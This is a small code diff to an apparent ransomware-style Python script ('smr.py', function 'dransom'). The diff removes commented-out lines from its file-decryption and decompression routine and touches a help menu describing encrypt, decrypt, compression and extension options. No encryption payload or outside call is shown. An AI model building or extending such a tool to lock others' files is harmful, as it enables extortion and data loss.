@@ -114,10 +114,7 @@ def dransom(passw, ext, path):
                     os.rename(f"{files[i][2:]}", f"{files[i][2:-(len(ext)+1)]}")
                     files[i] = files[i][:-(len(ext)+1)]
             print(f"[{str(int(round(time.time() * 1000)))[6:]}] Decrypting file {files[i]}...")
-#            f = open(files[i], "r+")
-#            fContent = f.read()
 
-# Decompress
             if compression:
                 print("Staring decompression...")
                 with lzma.open(files[i]) as f:
@@ -125,9 +122,6 @@ def dransom(passw, ext, path):
             else:
                 f = open(files[i], "r+")
                 fContent = f.read()
-#                obj = lzma.LZMAFile(files[i], mode="r")
-#                fContent = lzmaFile.read().decode("utf-8")
-
             fContent = fContent.split("+")
             if os.path.splitext(files[i])[1]:
                 if os.path.splitext(files[i])[1] == f".{ext}":
@@ -153,7 +147,7 @@ def cli(recursion):
 
     helpMenu = f"""Usage: python smr.py [-option1] [-option2] [...]
  -a,  --adition  Add/Remove file extension to/from file.
- -c,  --compression  Compress/Decompress the files to reduce end size.
+ -c,  --compression  Compress/Decompress the files to reduce end size. 
  -d,  --decrypt  Only decrypt. If a non encrypted file is in the path, will be encrypted.
  -e,  --encrypt  Only encrypt. Uses weak Symmetric-key algorithm. Similar to Vernan or Affine encryption.
  -h,  --help     Open this menu.
